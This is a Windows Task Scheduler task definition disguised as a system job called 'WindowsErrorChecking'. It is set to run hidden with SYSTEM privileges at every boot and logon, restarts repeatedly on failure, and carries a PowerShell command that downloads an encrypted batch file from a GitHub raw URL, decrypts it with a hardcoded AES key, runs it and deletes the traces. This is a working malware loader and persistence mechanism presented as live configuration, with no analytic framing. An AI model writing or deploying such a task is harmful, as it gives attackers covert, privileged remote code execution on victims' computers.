<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2024-12-19T10:20:47.2761859</Date>
    <Author>LAPTOP-UDHP41S0\TEST</Author>
    <URI>\WindowsErrorChecking</URI>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>100</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell</Command>
      <Arguments>while (-not (Test-Connection google.com -Count 1 -Quiet)) { Start-Sleep 5 }</Arguments>
    </Exec>
    <Exec>
      <Command>powershell</Command>
      <Arguments>-Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/b.bat' -OutFile '%TEMP%\WindowsErrorChecking.bat'; $encryptedBytes = [System.IO.File]::ReadAllBytes('%TEMP%\WindowsErrorChecking.bat'); $key = [System.Text.Encoding]::UTF8.GetBytes('1234567890123456'); $iv = [System.Text.Encoding]::UTF8.GetBytes('1234567890123456'); $aes = [System.Security.Cryptography.AesManaged]::new(); $aes.Key = $key; $aes.IV = $iv; $decryptor = $aes.CreateDecryptor(); $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length); [System.IO.File]::WriteAllBytes('%TEMP%\WindowsShell.bat', $decryptedBytes); Start-Process '%TEMP%\WindowsShell.bat' -Wait; Remove-Item '%TEMP%\WindowsErrorChecking.bat', '%TEMP%\WindowsShell.bat' -Force"</Arguments>
    </Exec>
  </Actions>
</Task>
